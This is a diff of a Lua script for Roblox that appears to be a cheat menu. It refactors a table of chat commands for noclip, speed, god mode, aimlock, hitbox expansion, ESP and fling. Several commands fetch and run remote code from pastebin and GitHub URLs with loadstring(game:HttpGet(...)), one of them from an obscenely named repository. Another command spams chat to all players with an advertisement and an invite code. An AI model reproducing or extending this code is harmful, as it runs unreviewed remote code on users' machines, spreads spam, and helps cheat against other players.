-    addExtraBtn("🔊 Unmute Sounds", "Restore all sound volumes", function()
-        for _, v in ipairs(workspace:GetDescendants()) do
-            if v:IsA("Sound") then pcall(function() v.Volume = 1 end) end
-        end
-    end)
-
-    addExtraBtn("🕐 Pause Time", "Freeze the lighting clock", function()
-        game:GetService("Lighting").ClockTime = game:GetService("Lighting").ClockTime
-        game:GetService("RunService"):BindToRenderStep("PauseTime", 1, function()
-            -- intentionally empty — prevents auto time advance in some games
-        end)
-    end)
-
-    addExtraBtn("💣 Explode Nearby", "Create explosion at your position", function()
-        local root = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
-        if not root then return end
-        local e = Instance.new("Explosion")
-        e.Position = root.Position
-        e.BlastRadius = 20
-        e.BlastPressure = 0  -- visual only, no damage force
-        e.Parent = workspace
-    end)
-    local finalH = math.min(contentH + 60, 480)
-    TweenService:Create(eg, TweenInfo.new(0.38, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
-        { Size = UDim2.new(0, 320, 0, finalH) }):Play()
-
-    -- Drag
-    local ed, eds, edp = false, nil, nil
-    eHdr.InputBegan:Connect(function(inp)
+    -- Draggable
+    local dragging2, dragStart2, dragPos2 = false, nil, nil
+    hdr.InputBegan:Connect(function(inp)
         if inp.UserInputType == Enum.UserInputType.MouseButton1 then
-            ed = true; eds = inp.Position; edp = eg.Position
-            inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then ed = false end end)
+            dragging2 = true; dragStart2 = inp.Position; dragPos2 = card.Position
+            inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then dragging2 = false end end)
         end
     end)
     UserInputService.InputChanged:Connect(function(inp)
-        if ed and inp.UserInputType == Enum.UserInputType.MouseMovement then
-            local d = inp.Position - eds
-            eg.Position = UDim2.new(edp.X.Scale, edp.X.Offset+d.X, edp.Y.Scale, edp.Y.Offset+d.Y)
+        if dragging2 and inp.UserInputType == Enum.UserInputType.MouseMovement then
+            local d = inp.Position - dragStart2
+            card.Position = UDim2.new(dragPos2.X.Scale, dragPos2.X.Offset+d.X, dragPos2.Y.Scale, dragPos2.Y.Offset+d.Y)
         end
     end)
 end
 
--- Wire up extra tab click to open the GUI
-extraPage.Parent = extraPage.Parent  -- keep page alive
 extraTabBtn.MouseButton1Click:Connect(function()
     switchTab("Extra")
-    openExtraGui()
+    openCmdList()
 end)
 
 -- ===================== DRAG =====================
@@ -3170,176 +2833,79 @@ end
 -- Command state tracker (which commands are currently active)
 local cmdActive = {}
 
+local actions = {
+    ["sfly"]        = function() cmdActive["sfly"] = not cmdActive["sfly"]; if cmdActive["sfly"] then pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/uxGd6Y83"))() end); showNotif("Superman Fly", true) else local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid"); if h then h.PlatformStand=false end; showNotif("Superman Fly", false) end end,
+    ["baseplate"]   = function() cmdActive["baseplate"] = not cmdActive["baseplate"]; if cmdActive["baseplate"] then pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/likelysmith/EmptyTools/main/script"))() end); showNotif("Infinite Baseplate", true) else showNotif("Infinite Baseplate", false) end end,
+    ["speed"]       = function() cmdActive["speed"] = not cmdActive["speed"]; local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid"); if cmdActive["speed"] then if h then h.WalkSpeed=80 end; showNotif("Speed Boost", true) else if h then h.WalkSpeed=16 end; showNotif("Speed Boost", false) end end,
+    ["noclip"]      = function() cmdActive["noclip"] = not cmdActive["noclip"]; if cmdActive["noclip"] then RunService.Stepped:Connect(function() if not cmdActive["noclip"] then return end; local c=player.Character; if c then for _,p in pairs(c:GetDescendants()) do if p:IsA("BasePart") then p.CanCollide=false end end end end); showNotif("No Clip", true) else showNotif("No Clip", false) end end,
+    ["zoom"]        = function() cmdActive["zoom"] = not cmdActive["zoom"]; if cmdActive["zoom"] then camera.FieldOfView=90; showNotif("Infinite Zoom", true) else camera.FieldOfView=70; showNotif("Infinite Zoom", false) end end,
+    ["teleport"]    = function() cmdActive["teleport"] = not cmdActive["teleport"]; showNotif("Click Teleport [F]", cmdActive["teleport"]) end,
+    ["afk"]         = function() cmdActive["afk"] = not cmdActive["afk"]; if cmdActive["afk"] then local vu=game:GetService("VirtualUser"); player.Idled:Connect(function() if cmdActive["afk"] then vu:Button2Down(Vector2.new(0,0),camera.CFrame); task.wait(0.1); vu:Button2Up(Vector2.new(0,0),camera.CFrame) end end); showNotif("Anti-AFK", true) else showNotif("Anti-AFK", false) end end,
+    ["infijump"]    = function() cmdActive["infijump"] = not cmdActive["infijump"]; if cmdActive["infijump"] then UserInputService.JumpRequest:Connect(function() if not cmdActive["infijump"] then return end; local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid"); if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end end); showNotif("Infinite Jump", true) else showNotif("Infinite Jump", false) end end,
+    ["fullbright"]  = function() cmdActive["fullbright"] = not cmdActive["fullbright"]; local l=game:GetService("Lighting"); if cmdActive["fullbright"] then l.Brightness=10; l.ClockTime=14; l.FogEnd=100000; l.GlobalShadows=false; showNotif("Full Bright", true) else l.Brightness=1; l.GlobalShadows=true; showNotif("Full Bright", false) end end,
+    ["hidegui"]     = function() cmdActive["hidegui"] = not cmdActive["hidegui"]; screenGui.Enabled = not cmdActive["hidegui"]; showNotif("Hide GUI", cmdActive["hidegui"]) end,
+    ["sad"]         = function() showNotif("SAD", true); task.spawn(function() pcall(function() game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer("Soul V1 Script  in beta version right now","All") end); task.wait(4); pcall(function() game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer("join our comns  QGrXsqqbDc","All") end) end) end,
+    ["facebang"]    = function() cmdActive["facebang"] = not cmdActive["facebang"]; if cmdActive["facebang"] then pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/nomercy0000/face-fuck/refs/heads/main/mic%20up"))() end); showNotif("Face Bang", true) else showNotif("Face Bang", false) end end,
+    ["aimlock"]     = function() cmdActive["aimlock"] = not cmdActive["aimlock"]; showNotif("Aimlock", cmdActive["aimlock"]) end,
+    ["hitbox"]      = function() cmdActive["hitbox"] = not cmdActive["hitbox"]; showNotif("Hitbox Expander", cmdActive["hitbox"]) end,
+    ["autoclicker"] = function() cmdActive["autoclicker"] = not cmdActive["autoclicker"]; showNotif("Auto Clicker", cmdActive["autoclicker"]) end,
+    ["esp"]         = function() cmdActive["esp"] = not cmdActive["esp"]; showNotif("Player ESP", cmdActive["esp"]) end,
+    -- FPS
+    ["fpson"]       = function() for _,v in ipairs(workspace:GetDescendants()) do pcall(function() if v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then v.Enabled=false elseif v:IsA("Beam") or v:IsA("Trail") then v.Enabled=false elseif v:IsA("Texture") or v:IsA("Decal") then v.Transparency=1 end end) end; local l=game:GetService("Lighting"); l.GlobalShadows=false; for _,e in ipairs(l:GetChildren()) do if e:IsA("PostEffect") then e.Enabled=false end end; pcall(function() settings().Rendering.QualityLevel=Enum.QualityLevel.Level01 end); showNotif("FPS Boost ON", true) end,
+    ["fpsoff"]      = function() for _,v in ipairs(workspace:GetDescendants()) do pcall(function() if v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then v.Enabled=true elseif v:IsA("Beam") or v:IsA("Trail") then v.Enabled=true elseif v:IsA("Texture") or v:IsA("Decal") then v.Transparency=0 end end) end; local l=game:GetService("Lighting"); l.GlobalShadows=true; for _,e in ipairs(l:GetChildren()) do if e:IsA("PostEffect") then e.Enabled=true end end; pcall(function() settings().Rendering.QualityLevel=Enum.QualityLevel.Automatic end); showNotif("FPS Boost OFF", true) end,
+    -- Sound
+    ["mute"]        = function() for _,v in ipairs(workspace:GetDescendants()) do if v:IsA("Sound") then pcall(function() v.Volume=0 end) end end; showNotif("Muted All Sounds", true) end,
+    ["unmute"]      = function() for _,v in ipairs(workspace:GetDescendants()) do if v:IsA("Sound") then pcall(function() v.Volume=1 end) end end; showNotif("Unmuted All Sounds", true) end,
+    -- Time
+    ["day"]         = function() game:GetService("Lighting").ClockTime=14; showNotif("Daytime", true) end,
+    ["night"]       = function() game:GetService("Lighting").ClockTime=0;  showNotif("Night", true) end,
+    ["sunrise"]     = function() game:GetService("Lighting").ClockTime=6;  showNotif("Sunrise", true) end,
+    ["sunset"]      = function() game:GetService("Lighting").ClockTime=18; showNotif("Sunset", true) end,
+    ["fog"]         = function() local l=game:GetService("Lighting"); l.FogEnd=80; l.FogStart=0; l.FogColor=Color3.fromRGB(200,200,200); showNotif("Fog ON", true) end,
+    ["clearfog"]    = function() local l=game:GetService("Lighting"); l.FogEnd=100000; l.FogStart=0; showNotif("Fog Cleared", true) end,
+    -- Gravity
+    ["lowgrav"]     = function() workspace.Gravity=5;     showNotif("Low Gravity", true) end,
+    ["nograv"]      = function() workspace.Gravity=0;     showNotif("Zero Gravity", true) end,
+    ["highgrav"]    = function() workspace.Gravity=400;   showNotif("High Gravity", true) end,
+    ["normgrav"]    = function() workspace.Gravity=196.2; showNotif("Normal Gravity", true) end,
+    -- Character
+    ["invis"]       = function() local c=player.Character; if not c then return end; for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") or p:IsA("Decal") then p.Transparency=1 end end; showNotif("Invisible", true) end,
+    ["vis"]         = function() local c=player.Character; if not c then return end; for _,p in ipairs(c:GetDescendants()) do if p:IsA("BasePart") then p.Transparency=0 end; if p:IsA("Decal") then p.Transparency=0 end end; showNotif("Visible", true) end,
+    ["freeze"]      = function() local r=player.Character and player.Character:FindFirstChild("HumanoidRootPart"); if r then r.Anchored=true end; showNotif("Frozen", true) end,
+    ["unfreeze"]    = function() local r=player.Character and player.Character:FindFirstChild("HumanoidRootPart"); if r then r.Anchored=false end; showNotif("Unfrozen", true) end,
+    ["god"]         = function() RunService.Heartbeat:Connect(function() local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid"); if h then h.Health=h.MaxHealth end end); showNotif("God Mode ON", true) end,
+    ["fling"]       = function() local r=player.Character and player.Character:FindFirstChild("HumanoidRootPart"); if not r then return end; local bv=Instance.new("BodyVelocity"); bv.MaxForce=Vector3.new(1e5,1e5,1e5); bv.Velocity=Vector3.new(math.random(-80,80),200,math.random(-80,80)); bv.Parent=r; game:GetService("Debris"):AddItem(bv,0.2); showNotif("Flung!", true) end,
+    ["explode"]     = function() local r=player.Character and player.Character:FindFirstChild("HumanoidRootPart"); if not r then return end; local e=Instance.new("Explosion"); e.Position=r.Position; e.BlastRadius=20; e.BlastPressure=0; e.Parent=workspace; showNotif("Explode!", true) end,
+    ["spin"]        = function() local r=player.Character and player.Character:FindFirstChild("HumanoidRootPart"); if not r then return end; task.spawn(function() for _=1,60 do r.CFrame=r.CFrame*CFrame.Angles(0,math.rad(6),0); task.wait(0.01) end end); showNotif("Spin!", true) end,
+    ["reset"]       = function() local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid"); if h then h.Health=0 end; showNotif("Reset Character", true) end,
+    ["rejoin"]      = function() game:GetService("TeleportService"):Teleport(game.PlaceId, player) end,
+    ["fp"]          = function() player.CameraMaxZoomDistance=0.5; showNotif("First Person", true) end,
+    ["fc"]          = function() player.CameraMaxZoomDistance=400; showNotif("Free Camera", true) end,
+    ["maxjump"]     = function() local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid"); if h then pcall(function() h.UseJumpPower=true end); h.JumpPower=500 end; showNotif("Max Jump", true) end,
+    ["resetjump"]   = function() local h=player.Character and player.Character:FindFirstChildOfClass("Humanoid"); if h then pcall(function() h.UseJumpPower=true end); h.JumpPower=50 end; showNotif("Reset Jump", true) end,
+    ["spawn"]       = function() local sp=workspace:FindFirstChildOfClass("SpawnLocation"); local r=player.Character and player.Character:FindFirstChild("HumanoidRootPart"); if sp and r then r.CFrame=sp.CFrame+Vector3.new(0,5,0) end; showNotif("Goto Spawn", true) end,
+    ["disco"]       = function() local cols={Color3.fromRGB(255,0,0),Color3.fromRGB(0,255,0),Color3.fromRGB(0,0,255),Color3.fromRGB(255,255,0),Color3.fromRGB(255,0,255),Color3.fromRGB(0,255,255)}; task.spawn(function() local l=game:GetService("Lighting"); for _=1,30 do l.Ambient=cols[math.random(#cols)]; l.OutdoorAmbient=cols[math.random(#cols)]; task.wait(0.15) end; l.Ambient=Color3.fromRGB(70,70,70); l.OutdoorAmbient=Color3.fromRGB(70,70,70) end); showNotif("Disco!", true) end,
+    -- Sky colours
+    ["sky pink"]    = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(255,150,200); l.FogEnd=500; l.Ambient=Color3.fromRGB(220,80,160);  l.OutdoorAmbient=Color3.fromRGB(220,80,160);  showNotif("Pink Sky", true) end,
+    ["sky red"]     = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(180,0,0);     l.FogEnd=500; l.Ambient=Color3.fromRGB(120,0,0);      l.OutdoorAmbient=Color3.fromRGB(120,0,0);      showNotif("Red Sky", true) end,
+    ["sky blue"]    = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(0,100,220);   l.FogEnd=500; l.Ambient=Color3.fromRGB(0,50,140);     l.OutdoorAmbient=Color3.fromRGB(0,50,140);     showNotif("Blue Sky", true) end,
+    ["sky purple"]  = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(100,0,200);   l.FogEnd=500; l.Ambient=Color3.fromRGB(60,0,130);     l.OutdoorAmbient=Color3.fromRGB(60,0,130);     showNotif("Purple Sky", true) end,
+    ["sky green"]   = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(0,180,80);    l.FogEnd=500; l.Ambient=Color3.fromRGB(0,100,40);     l.OutdoorAmbient=Color3.fromRGB(0,100,40);     showNotif("Green Sky", true) end,
+    ["sky orange"]  = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(255,120,30);  l.FogEnd=500; l.Ambient=Color3.fromRGB(200,60,0);     l.OutdoorAmbient=Color3.fromRGB(200,60,0);     showNotif("Orange Sky", true) end,
+    ["sky yellow"]  = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(255,220,50);  l.FogEnd=500; l.Ambient=Color3.fromRGB(220,150,0);    l.OutdoorAmbient=Color3.fromRGB(220,150,0);    showNotif("Yellow Sky", true) end,
+    ["sky cyan"]    = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(0,210,230);   l.FogEnd=500; l.Ambient=Color3.fromRGB(0,130,160);    l.OutdoorAmbient=Color3.fromRGB(0,130,160);    showNotif("Cyan Sky", true) end,
+    ["sky black"]   = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(8,8,12);      l.FogEnd=500; l.Ambient=Color3.fromRGB(4,4,8);        l.OutdoorAmbient=Color3.fromRGB(4,4,8);        showNotif("Black Sky", true) end,
+    ["sky white"]   = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(230,240,255); l.FogEnd=500; l.Ambient=Color3.fromRGB(180,200,240);  l.OutdoorAmbient=Color3.fromRGB(180,200,240);  showNotif("White Sky", true) end,
+    ["sky galaxy"]  = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(20,0,60);     l.FogEnd=500; l.Ambient=Color3.fromRGB(10,0,40);      l.OutdoorAmbient=Color3.fromRGB(10,0,40);      showNotif("Galaxy Sky", true) end,
+    ["sky reset"]   = function() local l=game:GetService("Lighting"); l.FogColor=Color3.fromRGB(191,197,200); l.FogEnd=100000; l.FogStart=0; l.Ambient=Color3.fromRGB(70,70,70); l.OutdoorAmbient=Color3.fromRGB(70,70,70); l.GlobalShadows=true; l.Brightness=1; l.ClockTime=14; showNotif("Sky Reset", true) end,
+}
+
 -- The actual command handler
 local function handleChatCommand(msg)
-    local cmd = msg:lower():gsub("^"..chatCommandPrefix, ""):gsub("%s+", "")
-    if cmd == "help" then
-        showHelpNotif()
-        return true
-    end
-
-    -- Map command strings to toggle functions
-    local actions = {
-        ["sfly"]        = function()
-            cmdActive["sfly"] = not cmdActive["sfly"]
-            if cmdActive["sfly"] then
-                pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/uxGd6Y83"))() end)
-                showNotif("Superman Fly", true)
-            else
-                local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-                if hum then hum.PlatformStand = false end
-                showNotif("Superman Fly", false)
-            end
-        end,
-        ["baseplate"]   = function()
-            cmdActive["baseplate"] = not cmdActive["baseplate"]
-            if cmdActive["baseplate"] then
-                pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/likelysmith/EmptyTools/main/script"))() end)
-                showNotif("Infinite Baseplate", true)
-            else
-                showNotif("Infinite Baseplate", false)
-            end
-        end,
-        ["speed"]       = function()
-            cmdActive["speed"] = not cmdActive["speed"]
-            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-            if cmdActive["speed"] then
-                if hum then hum.WalkSpeed = 80 end
-                showNotif("Speed Boost", true)
-            else
-                if hum then hum.WalkSpeed = 16 end
-                showNotif("Speed Boost", false)
-            end
-        end,
-        ["noclip"]      = function()
-            cmdActive["noclip"] = not cmdActive["noclip"]
-            if cmdActive["noclip"] then
-                RunService.Stepped:Connect(function()
-                    if not cmdActive["noclip"] then return end
-                    local char = player.Character
-                    if char then
-                        for _, p in pairs(char:GetDescendants()) do
-                            if p:IsA("BasePart") then p.CanCollide = false end
-                        end
-                    end
-                end)
-                showNotif("No Clip", true)
-            else
-                showNotif("No Clip", false)
-            end
-        end,
-        ["zoom"]        = function()
-            cmdActive["zoom"] = not cmdActive["zoom"]
-            if cmdActive["zoom"] then
-                camera.FieldOfView = 90
-                showNotif("Infinite Zoom", true)
-            else
-                camera.FieldOfView = 70
-                showNotif("Infinite Zoom", false)
-            end
-        end,
-        ["teleport"]    = function()
-            cmdActive["teleport"] = not cmdActive["teleport"]
-            if cmdActive["teleport"] then
-                showNotif("Click Teleport [F]", true)
-            else
-                showNotif("Click Teleport [F]", false)
-            end
-        end,
-        ["afk"]         = function()
-            cmdActive["afk"] = not cmdActive["afk"]
-            if cmdActive["afk"] then
-                local vu = game:GetService("VirtualUser")
-                player.Idled:Connect(function()
-                    if cmdActive["afk"] then
-                        vu:Button2Down(Vector2.new(0,0), camera.CFrame)
-                        task.wait(0.1)
-                        vu:Button2Up(Vector2.new(0,0), camera.CFrame)
-                    end
-                end)
-                showNotif("Anti-AFK", true)
-            else
-                showNotif("Anti-AFK", false)
-            end
-        end,
-        ["infijump"]    = function()
-            cmdActive["infijump"] = not cmdActive["infijump"]
-            if cmdActive["infijump"] then
-                UserInputService.JumpRequest:Connect(function()
-                    if not cmdActive["infijump"] then return end
-                    local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
-                    if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
-                end)
-                showNotif("Infinite Jump", true)
-            else
-                showNotif("Infinite Jump", false)
-            end
-        end,
-        ["fullbright"]  = function()
-            cmdActive["fullbright"] = not cmdActive["fullbright"]
-            local lighting = game:GetService("Lighting")
-            if cmdActive["fullbright"] then
-                lighting.Brightness = 10; lighting.ClockTime = 14
-                lighting.FogEnd = 100000; lighting.GlobalShadows = false
-                showNotif("Full Bright", true)
-            else
-                lighting.Brightness = 1; lighting.GlobalShadows = true
-                showNotif("Full Bright", false)
-            end
-        end,
-        ["hidegui"]     = function()
-            cmdActive["hidegui"] = not cmdActive["hidegui"]
-            screenGui.Enabled = not cmdActive["hidegui"]
-            showNotif("Hide GUI", cmdActive["hidegui"])
-        end,
-        ["sad"]         = function()
-            showNotif("SAD", true)
-            task.spawn(function()
-                pcall(function()
-                    game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-                        :FindFirstChild("SayMessageRequest"):FireServer("Soul V1 Script  in beta version right now", "All")
-                end)
-                task.wait(4)
-                pcall(function()
-                    game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-                        :FindFirstChild("SayMessageRequest"):FireServer("join our comns  QGrXsqqbDc", "All")
-                end)
-            end)
-        end,
-        ["facebang"]    = function()
-            cmdActive["facebang"] = not cmdActive["facebang"]
-            if cmdActive["facebang"] then
-                pcall(function()
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/nomercy0000/face-fuck/refs/heads/main/mic%20up"))()
-                end)
-                showNotif("Face Bang", true)
-            else
-                showNotif("Face Bang", false)
-            end
-        end,
-        ["aimlock"]     = function()
-            cmdActive["aimlock"] = not cmdActive["aimlock"]
-            showNotif("Aimlock", cmdActive["aimlock"])
-        end,
-        ["hitbox"]      = function()
-            cmdActive["hitbox"] = not cmdActive["hitbox"]
-            showNotif("Hitbox Expander", cmdActive["hitbox"])
-        end,
-        ["autoclicker"] = function()
-            cmdActive["autoclicker"] = not cmdActive["autoclicker"]
-            showNotif("Auto Clicker", cmdActive["autoclicker"])
-        end,
-        ["esp"]         = function()
-            cmdActive["esp"] = not cmdActive["esp"]
-            showNotif("Player ESP", cmdActive["esp"])
-        end,
-    }
-
-    local action = actions[cmd]
-    if action then
-        action()
-        return true
-    end
+    local trimmed = msg:lower():gsub("^"..chatCommandPrefix, ""):gsub("^%s+", ""):gsub("%s+$", "")
+    if trimmed == "help" then showHelpNotif(); return true end
+    local action = actions[trimmed] or actions[trimmed:match("^(%S+)")]
+    if action then action(); return true end
     return false
 end
 
